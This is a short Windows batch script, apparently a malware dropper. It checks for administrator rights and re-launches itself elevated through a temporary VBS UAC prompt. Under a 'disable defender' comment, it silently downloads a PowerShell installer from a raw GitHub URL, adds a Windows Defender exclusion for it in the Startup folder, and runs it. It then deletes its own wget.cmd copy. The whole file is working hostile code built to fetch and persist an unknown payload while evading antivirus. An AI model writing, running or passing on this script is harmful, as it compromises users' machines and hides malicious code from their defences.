@echo off

if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
    )

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
REM disable defender

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/MuridFanny/0oiw91383u203218y3/tikus/installer.ps1 -Outfile installer.ps1"; Add-MpPreference -ExclusionPath "C:/users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/installer.ps1"; ./installer.ps1 

cd "C:/users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
del wget.cmd
